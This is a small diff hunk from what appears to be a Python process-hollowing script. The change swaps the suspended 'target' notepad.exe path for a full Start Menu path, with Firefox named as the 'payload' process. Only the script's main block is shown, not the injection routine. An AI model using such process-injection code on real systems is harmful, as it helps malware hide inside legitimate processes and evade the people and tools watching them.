@@ -67,7 +67,7 @@ def resume_process(process_info):
 
 
 if __name__ == "__main__":
-    target_process_path = "notepad.exe"  # Replace with the path to the target process
+    target_process_path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\notepad.exe"  # Replace with the path to the target process
     payload_path = "C:\\Program Files\\Mozilla Firefox\\firefox.exe"  # Replace with the path to the payload process
 
     process_info = create_suspended_process(target_process_path)
